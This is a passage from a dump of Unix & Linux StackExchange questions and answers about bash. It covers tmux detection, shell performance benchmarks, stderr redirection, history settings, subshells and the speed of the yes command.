<li><code>\cd</code> - Backslashes quote characters. If you quote one character of a word, the
shell treats the whole word as quoted.</li>
<li><code>builtin cd</code> - This directly tells the shell to use the builtin instead of the alias.</li>
</ul>
"
"How can I tell if I'm in a tmux session from a bash script?","10689","<bash><prompt><tmux>","63","<p>Tmux sets the <code>TMUX</code> environment variable in tmux sessions, and sets <code>TERM</code> to <code>screen</code>. This isn't a 100% reliable indicator (for example, you can't easily tell if you're running <code>screen</code> inside <code>tmux</code> or <code>tmux</code> inside <code>screen</code>), but it should be good enough in practice.</p>

<pre><code>if ! { [ ""$TERM"" = ""screen"" ] &amp;&amp; [ -n ""$TMUX"" ]; } then
  PS1=""@$HOSTNAME $PS1""
fi
</code></pre>

<p>If you need to integrate that in a complex prompt set via <code>PROMPT_COMMAND</code> (which is a bash setting, by the way, so shouldn't be exported):</p>

<pre><code>if [ ""$TERM"" = ""screen"" ] &amp;&amp; [ -n ""$TMUX"" ]; then
  PS1_HOSTNAME=
else
  PS1_HOSTNAME=""@$HOSTNAME""
fi
PROMPT_COMMAND='PS1=""$PS1_HOSTNAME…""'
</code></pre>

<p>If you ever need to test whether tmux is installed:</p>

<pre><code>if type tmux &gt;/dev/null 2&gt;/dev/null; then
  # you can start tmux if you want
fi
</code></pre>

<p>By the way, this should all go into <code>~/.bashrc</code>, not <code>~/.bash_profile</code> (see <a href=""https://superuser.com/questions/183870/difference-between-bashrc-and-bash-profile/183980#183980"">Difference between .bashrc and .bash_profile</a>). <code>~/.bashrc</code> is run in every bash instance and contains shell customizations such as prompts and aliases. <code>~/.bash_profile</code> is run when you log in (if your login shell is bash). Oddly, bash doesn't read <code>~/.bashrc</code> in login shells, so your <code>~/.bash_profile</code> should contain</p>

<pre><code>case $- in *i*) . ~/.bashrc;; esac
</code></pre>
"
"Why does Bash's source not need the execution bit?","291404","<bash><permissions><executable><source><conventions>","63","<p>Bash is an interpreter; it accepts input and does whatever it wants to.  It doesn't need to heed the executable bit.  In fact, Bash is portable, and can run on operating systems and filesystems that don't have any concept of an executable bit.</p>

<p>What does care about the executable bit is the operating system kernel.  When the Linux kernel performs an <code>exec</code>, for example, it checks that the filesystem is not mounted with a <code>noexec</code> option, it checks the executable bit of the program file, and enforces any requirements imposed by security modules (such as SELinux or AppArmor).</p>

<p>Note that the executable bit is a rather discretionary kind of control.  On a Linux x86-64 system, for example, you can bypass the kernel's verification of the executable bit by <a href=""//security.stackexchange.com/a/66611/27444"">explicitly invoking <code>/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</code> as the interpreter</a>:</p>

<pre><code>cp /bin/ls /tmp/
chmod -x /tmp/ls
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /tmp/ls
</code></pre>

<p>This is somewhat analogous to sourcing Bash source code in Bash, except that <code>ld.so</code> is the interpreter, and the code that it executes is machine code in ELF format.</p>
"
"What does ""rm is hashed"" mean?","105876","<bash><shell><command>","62","<p>It's a performance thing; instead of searching the whole path for the binary every time it is called, it's put into a hash table for quicker lookup. So any binary that's already in this hash table, is hashed. If you move binaries around when they're already hashed, it will still try to call them in their old location.</p>

<p>See also <code>help hash</code>, or <code>man bash</code> and search for <code>hash</code> under builtin commands there.</p>
"
"Is dash or some other shell ""faster"" than bash?","148035","<bash><performance><dash>","62","<h3>SHELL SEQ:</h3>

<p>Probably a useful means of bench-marking a shell's performance is to do a lot of very small, simple evaluations repetitively. It is important, I think, not just to loop, but to loop over <em>input</em>, because a shell needs to read <code>&lt;&amp;0</code>. </p>

<p>I thought this would complement the tests <a href=""https://unix.stackexchange.com/a/148061/52934"">@cuonglm already posted</a> because it demonstrates a single shell process's performance once invoked, as opposed to his which demonstrates how quickly a shell process loads when invoked. In this way, between us, we cover both sides of the coin.  </p>

<p>Here's a function to facilitate the demo:</p>

<pre><code>sh_bench() (                                               #dont copy+paste comments
    o=-c sh=$(command -v ""$1"") ; shift                     #get shell $PATH; toss $1
    [ -z ""${sh##*busybox}"" ] &amp;&amp; o='ash -c'                 #cause its weird
    set -- ""$sh"" $o ""'$(cat &lt;&amp;3)'"" -- ""$@""                 #$@ = invoke $shell
    time env - ""$sh"" $o ""while echo; do echo; done|$*""     #time (env - sh|sh) AC/DC
) 3&lt;&lt;-\SCRIPT                                                                      
#Everything from here down is run by the different shells    
    i=""${2:-1}"" l=""${1:-100}"" d=""${3:-                     
}""; set -- ""\$((n=\$n\${n:++\$i}))\$d""                     #prep loop; prep eval
    set -- $1$1$1$1$1$1$1$1$1$1                            #yup
    while read m                                           #iterate on input
    do  [ $(($i*50+${n:=-$i})) -gt ""$(($l-$i))"" ] ||       #eval ok?
            eval echo -n \""""$1$1$1$1$1""\""                  #yay!
        [ $((n=$i+$n)) -gt ""$(($l-$i))"" ] &amp;&amp;               #end game?
            echo ""$n"" &amp;&amp; exit                              #and EXIT
        echo -n ""$n$d""                                     #damn - maybe next time
    done                                                   #done 
#END
SCRIPT                                                     #end heredoc
</code></pre>

<p>It either increments a variable once per newline read or, as a slight-optimization, if it can, it increments 50 times per newline read. Every time the variable is incremented it is printed to <code>stdout</code>. It behaves a lot like a sort of <code>seq</code> cross <code>nl</code>. </p>

<p>And just to make it very clear what it does - here's some truncated <code>set -x;</code> output after inserting it just before <code>time</code> in the function above:</p>

<pre><code>time env - /usr/bin/busybox ash -c '
     while echo; do echo; done |
     /usr/bin/busybox ash -c '""'$(
         cat &lt;&amp;3
     )'""' -- 20 5 busybox'
</code></pre>

<p>So each shell is first called like:</p>

<pre><code> env - $shell -c ""while echo; do echo; done |...""
</code></pre>

<p>...to generate the input that it will need to loop over when it reads in <code>3&lt;&lt;\SCRIPT</code> - or when <code>cat</code> does, anyway. And on the other side of that <code>|pipe</code> it calls itself again like:</p>

<pre><code>""...| $shell -c '$(cat &lt;&lt;\SCRIPT)' -- $args""
</code></pre>

<p>So aside from the initial call to <code>env</code> <em>(because <code>cat</code> is actually called in the previous line)</em>; no other processes are invoked from the time it is called until it exits. At least, I hope that's true. </p>

<h3>Before the numbers...</h3>

<p>I should make some notes on portability. </p>

<ul>
<li><p><code>posh</code> doesn't like <code>$((n=n+1))</code> and insists on <code>$((n=$n+1))</code></p></li>
<li><p><code>mksh</code> doesn't have a <code>printf</code> builtin in most cases. Earlier tests had it lagging a great deal - it was invoking <code>/usr/bin/printf</code> for every run. Hence the <code>echo -n</code> above.</p></li>
<li><p>maybe more as I remember it...</p></li>
</ul>

<h3>Anyway, to the numbers:</h3>

<pre><code>for sh in dash busybox posh ksh mksh zsh bash
do  sh_bench $sh 20 5 $sh 2&gt;/dev/null
    sh_bench $sh 500000 | wc -l
echo ; done
</code></pre>

<p>That'll get 'em all in one go...</p>

<pre><code>0dash5dash10dash15dash20

real    0m0.909s
user    0m0.897s
sys     0m0.070s
500001

0busybox5busybox10busybox15busybox20

real    0m1.809s
user    0m1.787s
sys     0m0.107s
500001

0posh5posh10posh15posh20

real    0m2.010s
user    0m2.060s
sys     0m0.067s
500001

0ksh5ksh10ksh15ksh20

real    0m2.019s
user    0m1.970s
sys     0m0.047s
500001

0mksh5mksh10mksh15mksh20

real    0m2.287s
user    0m2.340s
sys     0m0.073s
500001

0zsh5zsh10zsh15zsh20

real    0m2.648s
user    0m2.223s
sys     0m0.423s
500001

0bash5bash10bash15bash20

real    0m3.966s
user    0m3.907s
sys     0m0.213s
500001
</code></pre>

<h3>ARBITRARY = MAYBE OK?</h3>

<p>Still, this is a rather arbitrary test, but it does test reading input, arithmetic evaluation, and variable expansion. Maybe not comprehensive, but possibly near to there.</p>

<p><strong>EDIT by Teresa e Junior</strong>: @mikeserv and I have done many other tests (see <a href=""http://chat.stackexchange.com/rooms/16163/"">our chat</a> for details), and we found the results could be summarized like this:</p>

<ul>
<li>If you need speed, go definitely with <strong>dash</strong>, it is much faster than any other shell and about 4x faster than <em>bash</em>.</li>
<li>While <strong>busybox</strong>'s shell can be much slower than <em>dash</em>, in some tests it could be faster, because it has many of its own userland utilities, like <code>grep</code>, <code>sed</code>, <code>sort</code>, etc., which don't have as many features as the commonly used GNU utilities, but can get the work done as much.</li>
<li>If speed is not everything you care about, <strong>ksh</strong> (or <em>ksh93</em>) can be considered the best compromisse between speed and features. It's speed compares to the smaller <em>mksh</em>, which is way faster than <em>bash</em>, and it has also some unique features, like <a href=""https://unix.stackexchange.com/questions/137110/"">floating point arithmetic</a>.</li>
<li>Although <strong>bash</strong> is famous for its simplicity, stability, and functionality, it was the slowest of all shells in the majority of our tests, and by a large margin.</li>
</ul>
"
"su does not change user but does not respond with an error either","39314","<bash><su>","62","<p>Check what shell the user has in <code>/etc/passwd</code>. If the shell is <code>/bin/false</code> (a common shell to disallow logins), then you will see the behavior you describe. Alternatively, it may be some other immediately-terminating program that gives the same effective result.</p>
"
"Get path of current script when executed through a symlink","17499","<bash><shell-script><symlink>","62","<p>Try this as a general purpose solution:</p>

<pre class=""lang-none prettyprint-override""><code>DIR=""$(cd ""$(dirname ""$0"")"" &amp;&amp; pwd)""
</code></pre>

<p>In the specific case of following symlinks, you could also do this:</p>

<pre class=""lang-none prettyprint-override""><code>DIR=""$(dirname ""$(readlink -f ""$0"")"")""
</code></pre>
"
"Can I get individual man pages for the bash builtin commands?","18087","<bash><man><shell-builtin>","62","<p>Try this:</p>

<pre><code>bashman () { man bash | less -p ""^       $1 ""; }
</code></pre>

<p>You may have to hit <kbd>n</kbd> a couple of times to get to the actual command instead of a paragraph that happens to have the command name as the first word.</p>

<p><strong>Explanation:</strong> this pipes the entire output of <code>man bash</code>, i.e. bash's entire man page (which is a huge document, and has subsections explaining each bash builtin command) to the reading program <code>less</code>. less' <code>-p</code> flag stands for ""pattern""; what it does is automatically scroll to the first point in the input text that matches the pattern. The pattern here is a regex which matches ""The start of a line (<code>^</code>), followed by a specific number of spaces, followed by ..."" – and here, bash inserts the first argument provided to the <code>bashman</code> function, because bash sees the special <code>$1</code> token (which means ""the first argument"") in a string delimited with double-quotes (single quotes would tell bash that you literally mean the characters <code>$1</code>). So, if you run <code>bashman cd</code>, you will effectively be searching for any line in bash's man page with starts with a bunch of spaces, then the string ""cd"". Because there might be other points in bash's entire man page that also match this pattern <em>besides</em> the actual heading of the section that explains, eg., ""cd"", this function may not actually take you to the correct part of the bash man page.</p>
"
"Making zsh default shell without root access","136423","<bash><zsh><login><profile>","61","<p>Create <code>.bash_profile</code> in your home directory and add these lines:</p>

<pre><code>export SHELL=/bin/zsh
exec /bin/zsh -l
</code></pre>

<p>Update: <code>.profile</code> may work as a general solution when default shell is not bash. I'm not sure if <code>.profile</code> may be called by Zsh as well that it could go redundant but we can do it safely with a simple check:</p>

<pre><code>export SHELL=/bin/zsh
[ -z ""$ZSH_VERSION"" ] &amp;&amp; exec /bin/zsh -l
</code></pre>

<p>We can also use <code>which</code> to get the dynamic path of <code>zsh</code> which relies on the value of <code>$PATH</code>:</p>

<pre><code>export SHELL=`which zsh`
[ -z ""$ZSH_VERSION"" ] &amp;&amp; exec ""$SHELL"" -l
</code></pre>
"
"How to print only defined variables (shell and/or environment variables) in bash","3510","<bash><environment-variables>","61","<p>""Are there other commands which prints only the shell variables, without the functions?""</p>

<p>In man bash, in section SHELL BUILTIN COMMANDS (in the set section) it says:
""In posix mode,  only  shell variables  are listed.""</p>

<pre><code>(set -o posix; set)
</code></pre>

<p>note: <code>()</code> syntax spawns a subshell, if you don't like forking just use the more verbose version</p>

<pre><code>set -o posix; set; set +o posix
</code></pre>
"
"Refresh aliases and functions after defining new aliases and functions?","22919","<bash><terminal><alias><bashrc><function>","61","<p>Sourcing the changed file will provide access to the newly written alias or function in the current terminal, for example:</p>

<pre><code>source ~/.bashrc</code></pre>

<p>An alternative syntax:</p>

<pre><code>. ~/.bashrc
</code></pre>

<p>Note that if you have many instances of bash running in your terminal (you mentionned multiple tabs), you will have to run this in every instance.</p>
"
"Why does bash think: 016 + 1 = 15?","178162","<bash>","61","<p>The misunderstanding is that the numbers don't mean what you expect.</p>

<p>A leading zero denotes a number with base 8. I.e. <code>016</code> is the same as <code>8#16</code>. If you want to keep the leading zero then you need <code>10#016</code>.</p>

<pre><code>&gt; num=016
&gt; echo $((num))
14
&gt; echo $((10#$num))
16
</code></pre>
"
"How to echo a bang!","3051","<command-line><bash><echo>","61","<p>Try using single quotes.</p>

<pre><code>echo -e '#!/bin/bash \n /usr/bin/command args'  &gt; .scripts/command

echo '#!'

echo '#!/bin/bash'
</code></pre>

<p>The problem is occurring because bash is searching its history for !/bin/bash. Using single quotes escapes this behaviour.</p>
"
"Bash: run command2 if command1 fails","15415","<bash><shell-script><exit-status>","61","<p>These should do what you need:</p>

<pre><code>cmd1 &amp;&amp; cmd2 &amp;&amp; echo success || echo epic fail
</code></pre>

<p>or</p>

<pre><code>if cmd1 &amp;&amp; cmd2; then
    echo success
else
    echo epic fail
fi
</code></pre>
"
"How to create custom commands in Unix/Linux?","84686","<linux><bash><shell><command>","61","<p>Create a bash script in your /usr/bin folder, it should look something like this</p>

<pre><code>#!/bin/bash
Whatever combination of commands you want to run when you type this thing.
</code></pre>

<p>Its really that easy.</p>

<p>Just name the bash script what you want to type in to the terminal, and make it excecutable: <code>chmod +x filename</code> and you're good to go!</p>
"
"Terminating an infinite loop","42287","<bash><signals>","61","<p>Check the exit status of the command.  If the command was terminated by a signal the exit code will be 128 + the signal number.  From the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Exit-Status"">GNU online documentation for bash</a>:</p>

<blockquote>
  <p>For the shell’s purposes, a command which exits with a zero exit status has succeeded. A non-zero exit status indicates failure. This seemingly counter-intuitive scheme is used so there is one well-defined way to indicate success and a variety of ways to indicate various failure modes. When a command terminates on a fatal signal whose number is N, Bash uses the value 128+N as the exit status.</p>
</blockquote>

<p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_08_02"">POSIX also specifies</a> that the value of a command that terminated by a signal is greater than 128, but does not seem to specify its exact value like GNU does:</p>

<blockquote>
  <p>The exit status of a command that terminated because it received a signal shall be reported as greater than 128.</p>
</blockquote>

<p>For example if you interrupt a command with control-C the exit code will be 130, because SIGINT is signal 2 on Unix systems.  So:</p>

<pre><code>while [ 1 ]; do COMMAND; test $? -gt 128 &amp;&amp; break; done
</code></pre>
"
"cd by just typing the directory's name?","37181","<bash><shell><command-line><directory><cd-command>","60","<ul>
<li>Bash:  <code>shopt -s autocd</code></li>
<li>Zsh: <code>setopt autocd</code></li>
<li>tcsh: <code>set implicitcd</code></li>
</ul>

<p>Also, 'autojump' is a useful tool.  Once installed it remembers directories so that you can type j abc and if you've visited abc before, say x/d/f/g/t/abc then it will cd to there!<br>
<a href=""https://github.com/joelthelion/autojump"">https://github.com/joelthelion/autojump</a></p>
"
"suppress stderr messages in a bash script","184804","<bash><shell-script><stderr>","60","<p>You're right; pkill isn't generating the message, bash is. 
You suggest that</p>

<pre class=""lang-none prettyprint-override""><code>$ ./test1.sh 2&gt; /dev/null
</code></pre>

<p>is a possible solution. 
As UVV points out, the equivalent action from within the script is</p>

<pre class=""lang-none prettyprint-override""><code>exec 2&gt; /dev/null
</code></pre>

<p>This redirects the stderr for the script to <code>/dev/null</code>
from this statement until it is changed back. 
Clumsy ways of changing it back include</p>

<pre class=""lang-none prettyprint-override""><code>exec 2&gt; /dev/tty
</code></pre>

<p>which redirects stderr to the terminal. 
This is probably (but not necessarily) where it was originally.</p>

<p>Or</p>

<pre class=""lang-none prettyprint-override""><code>exec 2&gt;&amp;1
</code></pre>

<p>which sets stderr to be the same as stdout, and is likely to be wrong.</p>

<p>A more reliable way is</p>

<pre>exec 3>&2
exec 2> /dev/null
<i>(do stuff where you don't want to see the stderr.)</i>
exec 2>&3</pre>

<p>which saves the original stderr in file descriptor 3, and later restores it.</p>

<p>Other ways to suppress just the announcement of the process death include</p>

<pre class=""lang-none prettyprint-override""><code>(sleep 10 &amp; pkill sleep) 2&gt; /dev/null
</code></pre>

<p>and</p>

<pre class=""lang-none prettyprint-override""><code>{ sleep 10 &amp; pkill sleep;} 2&gt; /dev/null
</code></pre>

<p>which change the stderr for only the grouped commands.</p>
"
"Why is bash not storing commands that start with spaces?","115917","<bash><command-history><whitespace>","60","<pre><code>echo $HISTCONTROL
ignoreboth
</code></pre>
<p>man bash:</p>
<blockquote>
<p>HISTCONTROL</p>
<p>A  colon-separated  list  of values controlling how commands are saved on the history list.  If the list of values includes <code>ignorespace</code>, lines which begin with a space character are not saved in the history list. A value of <code>ignoredups</code> causes lines matching the previous history entry to not be saved. A value of <code>ignoreboth</code> is shorthand for <code>ignorespace</code> and <code>ignoredups</code>.</p>
</blockquote>
"
"Is there any way to enable Ctrl+L to clear screen when 'set -o vi' is set?","104094","<bash><readline><vi-mode>","60","<p><kbd>Ctrl</kbd>+<kbd>L</kbd> is also bound in <code>vi</code> command mode but not in insert mode. There's no default binding for <code>clear-screen</code> in insert mode. Readline bindings should be specified in <code>~/.inputrc</code>, like so:</p>
<pre class=""lang-bsh prettyprint-override""><code>set editing-mode vi
$if mode=vi

set keymap vi-command
# these are for vi-command mode
Control-l: clear-screen

set keymap vi-insert
# these are for vi-insert mode
Control-l: clear-screen 
$endif
</code></pre>
<p>This will bind <kbd>Ctrl</kbd>+<kbd>L</kbd> to clear the screen in both normal and insert mode. Naturally, if you prefer to only use it in one mode, just remove the relevant option.</p>
<p>If you prefer to set this just for <code>bash</code> use the following equivalents in <code>~/.bashrc</code>:</p>
<pre class=""lang-bsh prettyprint-override""><code>set -o vi
bind -m vi-command 'Control-l: clear-screen'
bind -m vi-insert 'Control-l: clear-screen'
</code></pre>
<p>There is an <a href=""https://web.archive.org/web/20150403162757/http://linux.about.com/library/cmd/blcmdl3_readline.htm"" rel=""noreferrer"">extensive list of readline commands</a> that you can use to customize your bash shell with.</p>
"
"How does `yes` write to file so quickly?","257297","<bash><coreutils><write><yes>","60","<h3>nutshell:</h3>

<p><code>yes</code> exhibits similar behavior to most other standard utilities which typically <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap03.html#tag_03_443"" rel=""noreferrer"">write</a> to a <a href=""https://www.le.ac.uk/users/rjm1/cotter/page_74.htm"" rel=""noreferrer"">FILE STREAM</a> with output buffered by the libC via <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdio.h.html"" rel=""noreferrer"">stdio</a>. These only do the syscall <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/write.html"" rel=""noreferrer""><code>write()</code></a> every some 4kb <em>(16kb or 64kb)</em> or whatever the output block <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/setbuf.html"" rel=""noreferrer"">BUFSIZ</a> is . <code>echo</code> is a <code>write()</code> per <em><code>GNU</code></em>. That's a <em>lot</em> of <a href=""https://stackoverflow.com/q/1860253/2955202"">mode-switching</a> <em>(which is not, apparently, as costly as a <a href=""https://en.wikipedia.org/wiki/Context_switch#User_and_kernel_mode_switching"" rel=""noreferrer"">context-switch</a>)</em>.</p>

<p>And that's not at all to mention that, besides its initial optimization loop, <code>yes</code> is a very simple, tiny, compiled C loop and your shell loop is in no way comparable to a compiler optimized program.</p>

<hr>

<h3>but i was wrong:</h3>

<p>When I said before that <code>yes</code> used stdio, I only assumed it did because it behaves a lot like those that do. This was not correct - it only emulates their behavior in this way. What it actually does is very like an analog to the thing I did below with the shell: it first loops to conflate its arguments <em>(or <code>y</code> if none)</em> until they might grow no more without exceeding <code>BUFSIZ</code>.</p>

<p>A comment from the <a href=""http://code.metager.de/source/xref/gnu/coreutils/src/yes.c"" rel=""noreferrer"">source</a> immediately preceding the relevant <code>for</code> loop states:</p>



<pre><code>/* Buffer data locally once, rather than having the
large overhead of stdio buffering each item.  */
</code></pre>

<p><code>yes</code> does its does its own <code>write()</code>s thereafter.</p>

<hr>

<h3>digression:</h3>

<p><em>(As originally included in the question and retained for context to a possibly informative explanation already written here)</em>:</p>

<blockquote>
  <p>I've tried <code>timeout 1 $(while true; do echo ""GNU""&gt;&gt;file2; done;)</code> but unable to stop loop.</p>
</blockquote>

<p>The <code>timeout</code> problem you have with the command substitution - I think I get it now, and can explain why it doesn't stop. <code>timeout</code> doesn't start because its command-line is never run. Your shell forks a child shell, opens a pipe on its stdout, and reads it. It will stop reading when the child quits, and then it will interpret all the child wrote for <code>$IFS</code> mangling and glob expansions, and with the results it will replace everything from <code>$(</code> to the matching <code>)</code>.</p>

<p>But if the child is an endless loop that never writes to the pipe, then the child never stops looping, and <code>timeout</code>'s command-line is never completed before <em>(as I guess)</em> you do <code>CTRL-C</code> and kill the child loop. So <code>timeout</code> can  <em>never</em> kill the loop which needs to complete before it can start.   </p>

<hr>

<h3>other <code>timeout</code>s:</h3>

<p>...simply aren't as relevant to your performance issues as the amount of time your shell program must spend switching between user- and kernel-mode to handle output. <code>timeout</code>, though, is not as flexible as a shell might be for this purpose: where shells excel is in their ability to mangle arguments and manage other processes.</p>

<p>As is noted elsewhere, simply moving your <em><code>[fd-num] &gt;&gt; named_file</code></em> redirection to the loop's output target rather than only directing output there for the command looped over can substantially improve performance because that way at least the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/open.html"" rel=""noreferrer""><code>open()</code></a> syscall need only be done the once. This also is done below with the <code>|</code> pipe targeted as output for the inner loops.</p>

<hr>

<h3>direct comparison:</h3>

<p>You might do like:</p>

<pre class=""lang-sh prettyprint-override""><code>for cmd in  exec\ yes 'while echo y; do :; done'
do      set +m
        sh  -c '{ sleep 1; kill ""$$""; }&amp;'""$cmd"" | wc -l
        set -m
done
</code></pre>

<hr>

<pre><code>256659456
505401
</code></pre>

<p>Which is <em>kind</em> of like the command sub relationship described before, but there's no pipe and the child is backgrounded until it kills the parent. In the <code>yes</code> case the parent has actually been replaced since the child was spawned, but the shell calls <code>yes</code> by overlaying its own process with the new one and so the PID remains the same and its zombie child still knows who to kill after all.</p>

<hr>

<h3>bigger buffer:</h3>

<p>Now lets see about increasing the shell's <code>write()</code> buffer.</p>

<pre class=""lang-sh prettyprint-override""><code>IFS=""
"";    set y """"              ### sets up the macro expansion       
until [ ""${512+1}"" ]        ### gather at least 512 args
do    set ""$@$@"";done       ### exponentially expands ""$@""
printf %s ""$*""| wc -c       ### 1 write of 512 concatenated ""y\n""'s  
</code></pre>

<hr>

<pre><code>1024
</code></pre>

<p>I chose that number because output strings any longer than 1kb were getting split out into separate <code>write()</code>'s for me. And so here's the loop again:</p>

<pre class=""lang-sh prettyprint-override""><code>for cmd in 'exec  yes' \
           'until [ ""${512+:}"" ]; do set ""$@$@""; done
            while printf %s ""$*""; do :; done'
do      set +m
        sh  -c $'IFS=""\n""; { sleep 1; kill ""$$""; }&amp;'""$cmd"" shyes y """"| wc -l
        set -m
done
</code></pre>

<hr>

<pre><code>268627968
15850496
</code></pre>

<p>That's 300 times the amount of data written by the shell in the same amount of time for this test than the last. Not too shabby. But it's not <code>yes</code>.</p>

<hr>

<h3>related:</h3>

<p>As requested, there is a more thorough description than the mere code comments on what is done here at <a href=""https://unix.stackexchange.com/a/250626/52934"">this link</a>.</p>
"
"Is $() a subshell?","442692","<bash><subshell><syntax>","60","<p><code>$(…)</code> is a subshell by definition: it's a copy of the shell runtime state¹, and changes to the state made in the subshell have no impact on the parent. A subshell is typically implemented by <a href=""http://en.wikipedia.org/wiki/Fork_(system_call)"" rel=""noreferrer"">forking</a> a new process (but some shells may optimize this in some cases).</p>

<p>It isn't a subshell that you can retrieve variable values from. If changes to variables had an impact on the parent, it wouldn't be a subshell. It's a subshell whose <em>output</em> the parent can retrieve. The subshell created by <code>$(…)</code> has its standard output set to a pipe, and the parent reads from that pipe and collects the output.</p>

<p>There are several other constructs that create a subshell. I think this is the full list for bash:</p>

<ul>
<li>Subshell for <a href=""https://www.gnu.org/software/bash/manual/html_node/Command-Grouping.html#Command-Grouping"" rel=""noreferrer"">grouping</a>: <code>( … )</code> does nothing but create a subshell and wait for it to terminate). Contrast with <code>{ … }</code> which groups commands purely for syntactic purposes and does not create a subshell.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Lists.html"" rel=""noreferrer"">Background</a>: <code>… &amp;</code> creates a subshell and does not wait for it to terminate.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Pipelines.html#Pipelines"" rel=""noreferrer"">Pipeline</a>: <code>… | …</code> creates two subshells, one for the left-hand side and one for the right-hand side, and waits for both to terminate. The shell creates a pipe and connects the left-hand side's standard output to the write end of the pipe and the right-hand side's standard input to the read end. In some shells (ksh88, ksh93, zsh, bash with the <a href=""https://www.gnu.org/software/bash/manual/html_node/The-Shopt-Builtin.html#index-shopt"" rel=""noreferrer""><code>lastpipe</code> option</a> set and effective), the right-hand side runs in the original shell, so the pipeline construct only creates one subshell.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html#Command-Substitution"" rel=""noreferrer"">Command substitution</a>: <code>$(…)</code> (also spelled <code>`…`</code>) creates a subshell with its standard output set to a pipe, collects the output in the parent and expands to that output, minus its trailing newlines. (And the output may be further subject to splitting and globbing, but that's another story.)</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html#Process-Substitution"" rel=""noreferrer"">Process substitution</a>: <code>&lt;(…)</code> creates a subshell with its standard output set to a pipe and expands to the name of the pipe. The parent (or some other process) may open the pipe to communicate with the subshell. <code>&gt;(…)</code> does the same but with the pipe on standard input.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Coprocesses.html#Coprocesses"" rel=""noreferrer"">Coprocess</a>: <code>coproc …</code> creates a subshell and does not wait for it to terminate. The subshell's standard input and output are each set to a pipe with the parent being connected to the other end of each pipe.</li>
</ul>

<p>¹ <sub> <a href=""https://unix.stackexchange.com/questions/261638/is-a-sub-shell-the-same-thing-as-a-child-shell"">As opposed to running a separate shell</a>. </sub>  </p>
"
"In bash scripting, what's the different between declare and a normal variable?","254367","<bash><shell-script><variable>","60","<p>From <code>help -m declare</code>:</p>

<blockquote>
  <p><strong>NAME</strong><ul>
          <code>declare</code> - Set variable values and attributes.</ul></p>
  
  <p><strong>SYNOPSIS</strong><ul>
          <strong><code>declare</code></strong> [<strong><code>-aAfFgilnrtux</code></strong>] [<strong><code>-p</code></strong>] [<em><code>name</code></em>[<code>=<i>value</i></code>] ...]</ul></p>
  
  <p><strong>DESCRIPTION</strong><ul>
          Set variable values and attributes.</p>
  
  <p>Declare variables and give them attributes.  If no NAMEs are given,
          display the attributes and values of all variables.</p>
  
  <p>Options:<ul>
            <strong><code>-f</code></strong><ul>  restrict action or display to function names and definitions</ul>
            <strong><code>-F</code></strong><ul>  restrict display to function names only (plus line number and
              source file when debugging)</ul>
            <strong><code>-g</code></strong><ul>  create global variables when used in a shell function; otherwise
              ignored</ul>
            <strong><code>-p</code></strong><ul>  display the attributes and value of each NAME</ul></ul></p>
  
  <p>Options which set attributes:<ul>
            <strong><code>-a</code></strong><ul>  to make NAMEs indexed arrays (if supported)</ul>
            <strong><code>-A</code></strong><ul>  to make NAMEs associative arrays (if supported)</ul>
            <strong><code>-i</code></strong><ul>  to make NAMEs have the ‘integer’ attribute</ul>
            <strong><code>-l</code></strong><ul>  to convert NAMEs to lower case on assignment</ul>
            <strong><code>-n</code></strong><ul>  make NAME a reference to the variable named by its value</ul>
            <strong><code>-r</code></strong><ul>  to make NAMEs readonly</ul>
            <strong><code>-t</code></strong><ul>  to make NAMEs have the ‘trace’ attribute</ul>
            <strong><code>-u</code></strong><ul>  to convert NAMEs to upper case on assignment</ul>
            <strong><code>-x</code></strong><ul>  to make NAMEs export</ul></ul></p>
  
  <p>Using ‘<strong><code>+</code></strong>’ instead of ‘<strong><code>-</code></strong>’ turns off the given attribute.</p>
  
  <p>Variables with the integer attribute have arithmetic evaluation (see
          the <code>let</code> command) performed when the variable is assigned a value.</p>
  
  <p>When used in a function, <code>declare</code> makes NAMEs local, as with the <code>local</code>
          command.  The ‘<strong><code>-g</code></strong>’ option suppresses this behavior.</p>
  
  <p>Exit Status:<br>
          Returns success unless an invalid option is supplied or a variable
          assignment error occurs.</ul></p>
  
  <p><strong>SEE ALSO</strong><ul>
          bash(1)</ul></p>
  
  <p><strong>IMPLEMENTATION</strong><ul>
          GNU bash, version 4.3.11(1)-release (i686-pc-linux-gnu)<br>
          Copyright (C) 2013 Free Software Foundation, Inc.<br>
          License GPLv3+: GNU GPL version 3 or later &lt;http&colon;//gnu.org/licenses/gpl.html&gt;</ul></p>
</blockquote>

<hr>

<p>So, <code>declare</code> is used for setting variable values <strong>and attributes</strong>.</p>

<p>Let me show the use of two attributes with a very simple example:</p>

<pre><code>$ # First Example:
$ declare -r abc=ok
$ echo $abc
ok
$ abc=not-ok
bash: abc: readonly variable


$ # Second Example:
$ declare -i x=10
$ echo $x
10
$ x=ok
$ echo $x
0
$ x=15
$ echo $x
15
$ x=15+5
$ echo $x
20
</code></pre>

<p>From the above example, I think you should understand the usage of <strong><code>declare</code></strong> variable over normal variable! This type of <code>declare</code>ation is useful in functions, loops with scripting.</p>

<p>Also visit <a href=""http://www.tldp.org/LDP/abs/html/declareref.html"" rel=""noreferrer"">Typing variables: declare or typeset</a></p>
"
"With BASH after ""scrolling"" up to a previous command... how to then move on to the next in this history?","417052","<bash><command-history>","59","<p>Running the command with <kbd>Ctrl</kbd>+<kbd>o</kbd> instead of <kbd>Enter</kbd> will run a command from history and then queue up the next one instead of returning to the front of the bash history. </p>
"
"What's the most resource efficient way to count how many files are in a directory?","90106","<bash><shell><directory><ls>","59","<p>Short answer:</p>

<pre><code>\ls -afq | wc -l
</code></pre>

<p>(This includes <code>.</code> and <code>..</code>, so subtract 2.)</p>

<hr>

<p>When you list the files in a directory, three common things might happen:</p>

<ol>
